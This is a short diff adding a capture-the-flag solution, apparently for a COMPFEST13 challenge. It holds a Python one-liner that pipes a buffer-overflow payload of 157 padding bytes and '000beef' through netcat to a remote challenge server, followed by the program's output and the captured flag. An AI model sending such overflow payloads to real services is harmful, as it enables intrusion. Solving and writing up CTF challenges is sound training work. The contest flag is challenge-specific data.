@@ -1,0 +1,6 @@
+python -c "print(157 * 'a' + '000beef')" | nc 103.152.242.242 30146
+
+Enter your name plz!
+Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+Congratz, you get what u want!
+COMPFEST13{th1s_is_h0w_bufFer_overfloW_ActuaLLy_woRk5_a3925560}
